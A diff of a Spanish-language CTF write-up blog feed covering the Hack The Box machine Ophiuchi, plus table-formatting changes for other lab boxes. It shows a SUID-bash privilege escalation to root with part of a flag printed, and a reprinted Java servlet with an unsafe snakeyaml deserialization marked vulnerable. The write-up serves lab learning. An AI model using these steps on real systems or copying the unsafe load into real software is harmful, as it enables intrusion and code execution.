+admin@ophiuchi:/dev/shm$ ls -lah /bin/bash
+-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 1.2M Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /bin/bash
+admin@ophiuchi:/dev/shm$ bash -p
+bash-5.0# 
+bash-5.0# &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root/
+bash-5.0# ls
+go  root.txt  snap
+bash-5.0# cat root.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
+f86528dc1a751a5
+bash-5.0#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;yaml-tomcat-&#34;&gt;YAML TOMCAT&lt;/h2&gt;
+&lt;p&gt;Verificamos el codigo fuente de la aplicacion web desplegada en tomcat y vemos que la informacion enviada a &lt;code&gt;/Servlet&lt;/code&gt; es cargada con la libreria &lt;code&gt;snakeyaml&lt;/code&gt;, donde vemos tambien el codigo vulnerable.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.servlet.ServletException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.servlet.annotation.WebServlet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.servlet.http.HttpServlet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.servlet.http.HttpServletRequest&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;javax.servlet.http.HttpServletResponse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.yaml.snakeyaml.Yaml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;nd&#34;&gt;@WebServlet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Servlet&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Servlet&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpServlet&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;doPost&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServletException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;Yaml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;yaml&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Yaml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;yaml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//Vulnerable
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getWriter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Due to security reason this feature has been temporarily on hold. We will soon fix the issue!&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+  
+  &lt;span class=&#34;kd&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;doGet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServletException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/ophiuchi/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/ophiuchi/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>yaml</category>
+            
+          
+            
+              <category>deserialization</category>
+            
+          
+            
+              <category>java</category>
+            
+          
+            
+              <category>go</category>
+            
+          
+            
+              <category>wasm</category>
+            
+          
+            
+              <category>webassembly</category>
+            
+          
+            
+              <category>sudo privesc</category>
+            
+          
+            
+              <category>suid</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
       
       <item>
         <title>Hack The Box - Spectra</title>
@@ -47,29 +878,29 @@
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Nombre&lt;/th&gt;
-&lt;th align=&#34;center&#34;&gt;Spectra&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/317&#34;&gt;Spectra&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;OS&lt;/td&gt;
-&lt;td align=&#34;center&#34;&gt;Otro&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;Other&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
 &lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
 &lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
 &lt;td align=&#34;center&#34;&gt;10.10.10.229&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190&#34;&gt;egre55&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/1190&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;
@@ -84,30 +915,21 @@
       &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
       &amp;quot;datasets&amp;quot;:[
          {
-            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,
-            &amp;quot;data&amp;quot;:[5.9,4.4,4.6,5.4,5.6],
+            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[5.9, 4.4, 4.6, 5.4, 5.6],
             &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
             &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
          },
-         {
+         { 
             &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
-            &amp;quot;data&amp;quot;:[3,5,5,5,5],
+            &amp;quot;data&amp;quot;:[3, 5, 5, 5, 5],
             &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
             &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
          }
       ]
    },
-    &amp;quot;options&amp;quot;: {
-        &amp;quot;scale&amp;quot;: {
-            &amp;quot;ticks&amp;quot;: {
-                &amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;
-            },
-            &amp;quot;angleLines&amp;quot;:{
-                &amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;
-            },
-            &amp;quot;gridLines&amp;quot;:{
-                &amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;
-            }
+    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
+            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
+            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
         }
     }
 }
@@ -1561,34 +2383,30 @@ bash-4.3#
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/coldd/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;ColddBox: Easy&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;&lt;a href=&#34;https://tryhackme.com/room/colddboxeasy&#34;&gt;ColddBox: Easy&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIADnAQAAJgAAABgYAAAAACAA0gIAAA0CAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIAgAAAJCRaDYAAAGuSURBVHichZJLb9NAFIXPnbGbOg1xEuKqD5EUCSIWICRA3SCBBOL3smGPwrILWsQCRAkKSnmYNHE6ie3G9sxlYRE1diVmNY975pxv7hAzozQyZgIkUfnIKqwZ+DgZ+0ppY3bq7kPPI6zJREGQGHPq+4F/nqpwNJ3GWv/HwRbC3dxcLNN2wzW2lCimWnNgQAB3d3ZjNl//jL16syJlAZEK0Ca9ZB19jrJE6/sOiw1XbmyVBQyQDsfx6AiUkSOr3mNO48h/RxHrUDv3Xtmtbl6WMxAAUakbk6bxuaBaNOpfRhe2MPJCWVyVW61V2QqayapIpzmfDFkvDS0XoZKwZDBvdw5E5UZ+/QqaAcrCsZn/aLX39nc7szMdDRa9xs291jamg3QyBAjMKwcCs+U0hr8wfP/2oHf7qH8yDwJk+tvgrPvo+WF9GwDoSiQGk7CVMif94y8fvkNAhfHrN8eLYFrrvSC7ysxEawwAkHCmbJIWZKaN1jDaJJFJ42s6TSQA3Dl8+sSw//tncvqpJmbN/Y53q/vg2ct/ca5rXP4CsZqxMVW3SaUPuybI51eLyjt/ASLZ3ANVXBzWAAAAAElFTkSuQmCCiVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAIAAABvFaqvAAACmUlEQVR4nK2U205TQRSG15qZPfvQA6WHVIoQUyEcjFx4qxf6Ar6Cr2hCvNbExEQTInhhQCkCacFAactuu/fsmT0zXhgTqT2I8b9d83/JmrXWj9Za+B9i08tDpS7jCAAqfpBxnH8BWYB3Z63jfhggAkAMdimbe1JbRMDbgZTWrWhQGoh2GAJAIQjOCRGp9tl4y0QQI8SnbChErb7MOF9Ctju8dgi5dWsEMefyeC53dXGV8b1uLu8xh00GTSwAwFax3PccptKw3Wkk0cNSecrjaVMrev76fOnAWhexHOTuZnNTHuP4PbLGpiKRfZfR/SEKrbd8qbTm3jxxMkDobFAatmTnyIhrQJW6zPUCv/IYwA5OX+mkT4U2khBe4AubvLo+ozXZaSAS4roO4SaVUe+QahGLYeB6Wg7M8FK1T3l1bcQ1CmL5RV6sJ1cNLQVG2qKRvVY87HmcDxJGowSUcqtr/M7GDBAAsGw1PPsUJzFwAIra6DAKAQm1gAOZAVxYWQYcHfcoyJpUtr/6/pyfmUdGLbFht5tXolAqUAOIiU2VbO35S4/Q8X83joJV50jHbcYdSgka6wD9/KGx+/bQk5oKRRAYd8zgUjQ/zvyjWsTv77/ZrtTKxUpBJenB3mG3Fz7YXMxlvct2//y8s/Hs+dzNkY0BEZ4VJvv+9Q5zuOu7jFGZSKPNy+0dY0wcqyQWS09f0KA4AwQACJY5jFAiEykFICIiRlECAISg41AE86dr/IlYAGItAFiEn/uK+CuGJiTqGJCl9Hu+oCxQa/JJwtLUGKO1NloDWLCA4zJgzK0pmbROvzWbp8fNk4vmCTa+xGE/X6lW79VrK2sL9dXF1XXXD2aDbkjrfq+jtc6XyoROi4pZoL/WtGC7lX4AaqZB0zsC8QIAAAAASUVORK5CYII=&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;Room&lt;/td&gt;
-&lt;td&gt;ColddBox: Easy&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Descripción&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;An easy level machine with multiple ways to escalate privileges.&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Info&lt;/td&gt;
-&lt;td&gt;An easy level machine with multiple ways to escalate privileges.&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;60&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Puntos&lt;/td&gt;
-&lt;td&gt;60&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Facil&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Dificultad&lt;/td&gt;
-&lt;td&gt;Facil&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Maker&lt;/td&gt;
-&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/C0ldd&#34;&gt;C0ldd&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_thm&#34; style=&#34;margin-bottom: 5px;&#34;&gt; &lt;a href=&#34;https://tryhackme.com/p/C0ldd&#34;&gt;C0ldd&lt;/a&gt; &lt;img src=&#34;https://tryhackme-badges.s3.amazonaws.com/C0ldd.png&#34; class=&#34;user_maker_thm&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -1909,30 +2727,30 @@ sudo ftp
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/bruteit/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
+&lt;h1 id=&#34;room&#34;&gt;Room&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
-&lt;th&gt;Titulo&lt;/th&gt;
-&lt;th&gt;Brute It&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;Titulo&lt;/strong&gt;&lt;/th&gt;
